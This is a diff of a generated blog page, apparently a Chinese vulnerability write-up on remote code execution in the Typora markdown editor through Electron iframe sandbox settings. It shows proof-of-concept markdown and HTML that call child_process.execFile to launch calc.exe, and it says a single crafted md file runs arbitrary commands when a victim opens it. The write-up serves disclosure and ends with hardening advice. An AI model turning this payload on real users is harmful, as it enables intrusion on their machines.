@@ -64,8 +64,8 @@
   <meta name="generator" content="hexo">
   
   <meta name="theme-color" content="#ffffff" />
-  <link rel="icon" type="image/png" href="/images/static/avatar.png?v=1789832710811" />
-  <link rel="apple-touch-icon" href="/images/static/avatar.png?v=1789832710811" />
+  <link rel="icon" type="image/png" href="/images/static/avatar.png?v=1789835346211" />
+  <link rel="apple-touch-icon" href="/images/static/avatar.png?v=1789835346211" />
 
   
   
@@ -76,7 +76,7 @@
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 
   <!-- YOYO Theme Styles -->
-  <link rel="stylesheet" type="text/css" href="/css/screen.css?v=1789832710811" />
+  <link rel="stylesheet" type="text/css" href="/css/screen.css?v=1789835346211" />
   <link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500&display=swap" />
 
   
@@ -273,6 +273,7 @@
 <h3 id="round-1"><a href="#round-1" class="headerlink" title="round 1"></a>round 1</h3><p>输入：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
+<p><img src="/images/posts/typora-rce-via-iframe-sandbox-01.png" alt="Typora 把 &#96;javascript:alert(1)&#96; 当成 &#96;file:&#x2F;&#x2F;&#x2F;&#96; 相对路径处理"></p>
 <p>我们可以看到 Typora 会把 src 当做相对路径来处理，那如果我们包含一个本地的 html 文件呢？</p>
 <h3 id="round-2"><a href="#round-2" class="headerlink" title="round 2"></a>round 2</h3><p>新建 <code>poc.md</code> 输入：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;./poc.html&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
@@ -281,6 +282,7 @@
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">window</span>.<span class="property">parent</span>.<span class="property">top</span>.<span class="title function_">alert</span>(<span class="number">1</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>我们惊喜发现出现了弹窗！</p>
+<p><img src="/images/posts/typora-rce-via-iframe-sandbox-02.jpg" alt="alert(1) 弹窗"></p>
 <p><strong>这个 javascript 为什么执行了呢？</strong></p>
 <p>我们可以通过 Typora 的 dev mode 查看一下页面源码：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;E:\slide\vul\typora_poc\poc.html&quot;</span> <span class="attr">allow-top-navigation</span>=<span class="string">&quot;false&quot;</span> <span class="attr">allow-forms</span>=<span class="string">&quot;false&quot;</span> <span class="attr">allowfullscreen</span>=<span class="string">&quot;true&quot;</span> <span class="attr">allow-popups</span>=<span class="string">&quot;false&quot;</span> <span class="attr">sandbox</span>=<span class="string">&quot;allow-same-origin allow-scripts&quot;</span> <span class="attr">onload</span>=<span class="string">&quot;window.remoteOnLoad(this)&quot;</span> <span class="attr">height</span>=<span class="string">&quot;24&quot;</span> <span class="attr">data-user-height</span>=<span class="string">&quot;24&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
@@ -296,6 +298,7 @@
 <p>这样我们便可以修改一下 poc.html 的源码实现命令执行：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">//rce</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">window</span>.<span class="property">parent</span>.<span class="property">top</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execFile</span>(<span class="string">&#x27;C:/Windows/System32/calc.exe&#x27;</span>,<span class="keyword">function</span>(<span class="params">error, stdout, stderr</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span>(error)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(error);</span></span><br><span class="line"><span class="language-javascript">        &#125;  </span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
+<p><img src="/images/posts/typora-rce-via-iframe-sandbox-03.jpg" alt="修改 poc.html 后用 Typora 打开 poc.md，弹出计算器"></p>
 <p><strong>但是现在的漏洞利用起来非常鸡肋，受害者需要下载两个文件，同时保持在一个目录，再打开 poc.md，整个过程比较繁琐，能不能用一个文件实现呢？</strong></p>
 <h3 id="尝试-srcdoc"><a href="#尝试-srcdoc" class="headerlink" title="尝试 srcdoc"></a>尝试 srcdoc</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">&quot;&lt;script&gt;window.parent.top.alert(1)&lt;/script&gt;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -313,6 +316,7 @@
 <h3 id="直接引入-poc-md-自身"><a href="#直接引入-poc-md-自身" class="headerlink" title="直接引入 poc.md 自身"></a>直接引入 poc.md 自身</h3><p>修改 poc.md 文件内容：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;./poc.md&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">//rce</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">window</span>.<span class="property">parent</span>.<span class="property">top</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execFile</span>(<span class="string">&#x27;C:/Windows/System32/calc.exe&#x27;</span>,<span class="keyword">function</span>(<span class="params">error, stdout, stderr</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span>(error)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(error);</span></span><br><span class="line"><span class="language-javascript">        &#125;  </span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
+<p><img src="/images/posts/typora-rce-via-iframe-sandbox-04.jpg" alt="引入 cmd.md &#x2F; poc.md 自身后命令执行成功（计算器被弹出）"></p>
 <p><strong>现在，我们只需要发送一个 md 文件给受害者，一旦受害者使用 Typora 打开，我们便可以在受害者的电脑上执行任意命令。</strong></p>
 <h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>随着 Electron 框架在跨平台应用开发市场取得的巨大成功，越来越多的开发者采用 Electron 进行应用开发，那么如何在开发中比较好的避免出现这些风险呢，这里有几个建议：</p>
 <ol>
